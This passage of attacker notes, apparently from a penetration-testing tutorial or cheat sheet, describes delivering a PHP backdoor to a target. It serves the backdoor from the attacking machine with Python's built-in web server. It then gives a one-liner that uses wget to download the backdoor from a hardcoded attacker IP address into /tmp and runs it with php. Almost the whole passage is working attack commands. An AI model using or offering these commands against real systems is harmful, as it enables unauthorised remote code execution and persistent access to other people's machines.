# now the file is ready to be uploaded/downloaded onto the target
# one method is to serve the backdoor from the attacking machine via python's builtin webserver: 
python3 -m http.server
# or
python -m SimpleHTTPServer

# this one-liner can be used to download the php backdoor and execute it: 
wget 192.168.1.14:/backdoor.php -O /tmp/backdoor.php && php -f /tmp/backdoor.php
